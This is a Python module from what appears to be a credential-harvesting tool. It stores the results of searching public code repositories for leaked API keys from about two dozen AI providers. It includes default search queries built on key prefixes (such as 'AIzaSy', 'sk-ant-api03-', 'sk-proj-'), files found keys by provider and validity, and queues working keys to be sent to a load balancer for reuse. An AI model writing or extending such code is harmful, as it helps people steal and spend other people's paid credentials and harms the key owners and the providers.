import json
import os
import traceback
import threading
from dataclasses import dataclass, field
from datetime import datetime
from typing import Dict, List, Optional, Any, Set

from common.Logger import logger
from common.config import Config


@dataclass
class Checkpoint:
    last_scan_time: Optional[str] = None
    scanned_shas: Set[str] = field(default_factory=set)
    processed_queries: Set[str] = field(default_factory=set)
    wait_send_balancer: Set[str] = field(default_factory=set)
    wait_send_gpt_load: Set[str] = field(default_factory=set)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "last_scan_time": self.last_scan_time,
            "processed_queries": list(self.processed_queries),
            "wait_send_balancer": list(self.wait_send_balancer),
            "wait_send_gpt_load": list(self.wait_send_gpt_load)
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Checkpoint':
        return cls(
            last_scan_time=data.get("last_scan_time"),
            scanned_shas=set(),
            processed_queries=set(data.get("processed_queries", [])),
            wait_send_balancer=set(data.get("wait_send_balancer", [])),
            wait_send_gpt_load=set(data.get("wait_send_gpt_load", []))
        )

    def add_scanned_sha(self, sha: str) -> None:
        if sha:
            self.scanned_shas.add(sha)

    def add_processed_query(self, query: str) -> None:
        if query:
            self.processed_queries.add(query)

    def update_scan_time(self) -> None:
        self.last_scan_time = datetime.utcnow().isoformat()

    def reset_processed_queries(self) -> None:
        self.processed_queries.clear()


class FileManager:
    """File Manager - Multi-provider version (V2)"""

    # Updated provider list to match hajimi-king-v2.py
    PROVIDERS = {
        "gemini": "Google Gemini",
        "nvidia": "NVIDIA",
        "modelscope": "ModelScope",
        "xiaomi": "Xiaomi",
        "deepseek": "DeepSeek",
        "openrouter": "OpenRouter",
        "groq": "Groq",
        "anthropic": "Anthropic",
        "xai": "xAI (Grok)",
        "perplexity": "Perplexity",
        "huggingface": "HuggingFace",
        "replicate": "Replicate",
        "openai": "OpenAI",
        "baidu": "百度文心",
        "zhipu": "智谱GLM",
        "aliyun": "阿里通义",
        "tencent": "腾讯混元",
        "moonshot": "月之暗面Kimi",
        "volcengine": "字节豆包",
        "minimax": "MiniMax",
        "together": "Together AI",
        "fireworks": "Fireworks AI",
        "cohere": "Cohere",
        "mistral": "Mistral AI",
    }

    def __init__(self, data_dir: str):
        logger.info("Initializing FileManager V2 (13 Providers)")

        self.data_dir = data_dir
        self._lock = threading.RLock()
        self.checkpoint_file = os.path.join(data_dir, "checkpoint.json")
        self.scanned_shas_file = os.path.join(data_dir, Config.SCANNED_SHAS_FILE)

        self._detail_log_filename: Optional[str] = None
        self._keys_valid_filename: Dict[str, str] = {}
        self._rate_limited_filename: Dict[str, str] = {}
        self._invalid_filename: Dict[str, str] = {}
        self._rate_limited_detail_filename: Optional[str] = None
        self._keys_send_filename: Optional[str] = None
        self._keys_send_detail_filename: Optional[str] = None

        if not os.path.exists(self.data_dir):
            os.makedirs(self.data_dir, exist_ok=True)
            logger.info(f"Created data directory: {self.data_dir}")

        for provider in self.PROVIDERS.keys():
            provider_dir = os.path.join(self.data_dir, provider)
            if not os.path.exists(provider_dir):
                os.makedirs(provider_dir, exist_ok=True)
                logger.info(f"Created provider directory: {provider_dir}")

        # Load search queries
        try:
            queries_file = Config.QUERIES_FILE
            possible_paths = [
                queries_file,
                os.path.join(self.data_dir, queries_file),
                os.path.join(os.path.dirname(os.path.dirname(__file__)), queries_file),
                "/root/hajimi-king/queries.txt",
            ]
            full_path = None
            for path in possible_paths:
                if os.path.exists(path):
                    full_path = path
                    break
            if full_path is None:
                full_path = os.path.join(self.data_dir, queries_file)
                logger.warning(f"Queries file not found, will create at: {full_path}")
            self._search_queries = self.load_search_queries(full_path)
            logger.info(f"Loaded {len(self._search_queries)} search queries")
        except Exception as e:
            logger.error(f"Failed to load search queries: {e}")
            self._search_queries = []

        # Initialize filenames
        date_str = datetime.now().strftime('%Y%m%d')
        for provider in self.PROVIDERS.keys():
            provider_dir = os.path.join(self.data_dir, provider)
            self._keys_valid_filename[provider] = os.path.join(provider_dir, f"keys_valid_{date_str}.txt")
            self._rate_limited_filename[provider] = os.path.join(provider_dir, f"key_429_{date_str}.txt")
            self._invalid_filename[provider] = os.path.join(provider_dir, f"keys_invalid_{date_str}.txt")

        self._keys_send_filename = os.path.join(self.data_dir, f"keys_send_{date_str}.txt")
        self._detail_log_filename = os.path.join(self.data_dir, f"keys_valid_detail_{date_str}.log")
        self._rate_limited_detail_filename = os.path.join(self.data_dir, f"key_429_detail_{date_str}.log")
        self._keys_send_detail_filename = os.path.join(self.data_dir, f"keys_send_detail_{date_str}.log")

        # Create files
        all_files = [self._detail_log_filename, self._rate_limited_detail_filename,
                     self._keys_send_filename, self._keys_send_detail_filename]
        for provider in self.PROVIDERS.keys():
            all_files.append(self._keys_valid_filename[provider])
            all_files.append(self._rate_limited_filename[provider])
            all_files.append(self._invalid_filename[provider])
        for filename in all_files:
            if not os.path.exists(filename):
                parent_dir = os.path.dirname(filename)
                if parent_dir:
                    os.makedirs(parent_dir, exist_ok=True)
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write("")

        logger.info(f"FileManager V2 initialized for {len(self.PROVIDERS)} providers")

    def check(self) -> bool:
        if not hasattr(self, '_search_queries') or not self._search_queries:
            logger.error("Search queries not loaded or empty")
            return False
        logger.info(f"FileManager OK: {len(self._search_queries)} queries, {len(self.PROVIDERS)} providers")
        return True

    def load_checkpoint(self) -> Checkpoint:
        cp = Checkpoint()
        if os.path.exists(self.checkpoint_file):
            try:
                with open(self.checkpoint_file, "r", encoding="utf-8") as f:
                    cp = Checkpoint.from_dict(json.load(f))
            except Exception as e:
                logger.warning(f"Cannot read checkpoint: {e}. Creating new one.")
        else:
            self.save_checkpoint(cp)
        cp.scanned_shas = self.load_scanned_shas()
        return cp

    def load_scanned_shas(self) -> Set[str]:
        shas = set()
        if os.path.isfile(self.scanned_shas_file):
            try:
                with open(self.scanned_shas_file, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            shas.add(line)
            except Exception as e:
                logger.error(f"Failed to read scanned SHAs: {e}")
        return shas

    def load_search_queries(self, queries_file_path: str) -> List[str]:
        queries = []
        if not os.path.exists(queries_file_path):
            self._create_default_queries_file(queries_file_path)
        try:
            with open(queries_file_path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        queries.append(line)
        except Exception as e:
            logger.error(f"Failed to read queries: {e}")
        return queries

    def _create_default_queries_file(self, file_path: str) -> None:
        defaults = """# Multi-provider API Key Search Queries
AIzaSy in:file
AIzaSy filename:.env
nvapi- in:file
ms- in:file
tp- in:file
sk-or-v1- in:file
gsk_ in:file
sk-ant-api03- in:file
xai- in:file
pplx- in:file
hf_ in:file
r8_ in:file
sk-proj- in:file
"""
        try:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(defaults)
        except Exception as e:
            logger.error(f"Failed to create default queries: {e}")

    def save_valid_keys(self, repo_name: str, file_path: str, file_url: str, valid_keys: List[str], provider: str = "gemini") -> None:
        if not valid_keys:
            return
        keys_file = self._keys_valid_filename.get(provider) or self._keys_valid_filename.get("gemini")
        with self._lock:
            if self._detail_log_filename:
                with open(self._detail_log_filename, "a", encoding="utf-8") as f:
                    f.write(f"TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"PROVIDER: {provider.upper()}\n")
                    f.write(f"URL: {file_url}\n")
                    for key in valid_keys:
                        f.write(f"KEY: {key}\n")
                    f.write("-" * 80 + "\n")
            if keys_file:
                with open(keys_file, "a", encoding="utf-8") as f:
                    for key in valid_keys:
                        f.write(f"{key}\n")

    def save_rate_limited_keys(self, repo_name: str, file_path: str, file_url: str, rate_limited_keys: List[str], provider: str = "gemini") -> None:
        if not rate_limited_keys:
            return
        keys_file = self._rate_limited_filename.get(provider) or self._rate_limited_filename.get("gemini")
        with self._lock:
            if self._rate_limited_detail_filename:
                with open(self._rate_limited_detail_filename, "a", encoding="utf-8") as f:
                    f.write(f"TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"PROVIDER: {provider.upper()}\n")
                    f.write(f"URL: {file_url}\n")
                    for key in rate_limited_keys:
                        f.write(f"KEY: {key}\n")
                    f.write("-" * 80 + "\n")
            if keys_file:
                with open(keys_file, "a", encoding="utf-8") as f:
                    for key in rate_limited_keys:
                        f.write(f"{key}\n")

    def save_invalid_keys(self, invalid_keys: List[str], provider: str = "gemini") -> None:
        """Persist permanently invalid keys so restarts do not re-validate them."""
        if not invalid_keys:
            return
        keys_file = self._invalid_filename.get(provider) or self._invalid_filename.get("gemini")
        if not keys_file:
            return
        # Cohere regex too wide, cap invalid file to prevent disk fill
        if provider == "cohere":
            limit = Config.COHERE_MAX_INVALID_KEYS
            try:
                with open(keys_file, "r") as f:
                    existing = sum(1 for _ in f)
                if existing >= limit:
                    return  # Already at cap, skip
                # Trim if adding would exceed
                allowed = limit - existing
                if len(invalid_keys) > allowed:
                    invalid_keys = invalid_keys[:allowed]
            except FileNotFoundError:
                pass
        with self._lock:
            with open(keys_file, "a", encoding="utf-8") as f:
                for key in invalid_keys:
                    f.write(f"{key}\n")

    def cleanup_old_logs(self) -> int:
        """Delete data files older than LOG_RETENTION_DAYS. Returns count of deleted files."""
        deleted = 0
        cutoff = datetime.now().timestamp() - (Config.LOG_RETENTION_DAYS * 86400)
        try:
            for root, dirs, files in os.walk(self.data_dir):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    try:
                        mtime = os.path.getmtime(filepath)
                        if mtime < cutoff:
                            os.remove(filepath)
                            deleted += 1
                    except OSError:
                        pass
        except Exception as e:
            logger.warning(f"Log cleanup error: {e}")
        if deleted > 0:
            logger.info(f"Log cleanup: removed {deleted} old file(s)")
        return deleted

    def save_checkpoint(self, checkpoint: Checkpoint) -> None:
        try:
            with self._lock:
                with open(self.checkpoint_file, "w", encoding="utf-8") as f:
                    json.dump(checkpoint.to_dict(), f, indent=2)
                self.save_scanned_shas(checkpoint.scanned_shas)
        except Exception as e:
            logger.error(f"Failed to save checkpoint: {e}")

    def save_scanned_shas(self, scanned_shas: Set[str]) -> None:
        try:
            with self._lock:
                with open(self.scanned_shas_file, "w", encoding="utf-8") as f:
                    for sha in sorted(scanned_shas):
                        f.write(f"{sha}\n")
        except Exception as e:
            logger.error(f"Failed to save scanned SHAs: {e}")

    def save_keys_to_send(self, keys: List[str]) -> None:
        if not keys: return
        try:
            with open(self._keys_send_filename, "a", encoding="utf-8") as f:
                for key in keys: f.write(f"{key}\n")
        except Exception as e:
            logger.error(f"Failed to save keys to send: {e}")

    def save_keys_send_detail(self, repo_name: str, file_path: str, file_url: str, keys: List[str]) -> None:
        if not keys: return
        try:
            with open(self._keys_send_detail_filename, "a", encoding="utf-8") as f:
                f.write(f"TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"REPO: {repo_name}\nFILE: {file_path}\nURL: {file_url}\n")
                for key in keys: f.write(f"KEY: {key}\n")
                f.write("-" * 80 + "\n")
        except Exception as e:
            logger.error(f"Failed to save keys send detail: {e}")

    def save_keys_send_result(self, keys: List[str], send_result: Dict[str, str]) -> None:
        if not keys: return
        try:
            with open(self._keys_send_detail_filename, "a", encoding="utf-8") as f:
                f.write(f"TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"SEND_RESULT:\n")
                for key in keys:
                    result = send_result.get(key, "unknown")
                    f.write(f"  {key[:20]}...: {result}\n")
                f.write("-" * 80 + "\n")
        except Exception as e:
            logger.error(f"Failed to save send result: {e}")

    def read_keys_to_send(self) -> List[str]:
        keys = []
        if os.path.exists(self._keys_send_filename):
            try:
                with open(self._keys_send_filename, "r", encoding="utf-8") as f:
                    keys = [line.strip() for line in f if line.strip()]
            except Exception as e:
                logger.error(f"Failed to read keys to send: {e}")
        return keys

    def clear_keys_to_send(self) -> None:
        if os.path.exists(self._keys_send_filename):
            try:
                with open(self._keys_send_filename, "w", encoding="utf-8") as f:
                    f.write("")
            except Exception as e:
                logger.error(f"Failed to clear keys to send: {e}")

    @property
    def search_queries(self) -> List[str]:
        return self._search_queries

    def get_search_queries(self) -> List[str]:
        return self._search_queries

    def update_dynamic_filenames(self) -> None:
        current_date = datetime.now().strftime("%Y%m%d")
        for provider in self.PROVIDERS.keys():
            provider_dir = os.path.join(self.data_dir, provider)
            self._keys_valid_filename[provider] = os.path.join(provider_dir, f"keys_valid_{current_date}.txt")
            self._rate_limited_filename[provider] = os.path.join(provider_dir, f"key_429_{current_date}.txt")
            self._invalid_filename[provider] = os.path.join(provider_dir, f"keys_invalid_{current_date}.txt")
        self._detail_log_filename = os.path.join(self.data_dir, "gemini", "details", f"detail_{current_date}.log")
        details_dir = os.path.join(self.data_dir, "gemini", "details")
        if not os.path.exists(details_dir):
            os.makedirs(details_dir, exist_ok=True)

    @property
    def detail_log_filename(self) -> Optional[str]:
        return self._detail_log_filename

    @property
    def rate_limited_detail_filename(self) -> Optional[str]:
        return self._rate_limited_detail_filename


file_manager = FileManager(Config.DATA_PATH)
checkpoint = file_manager.load_checkpoint()
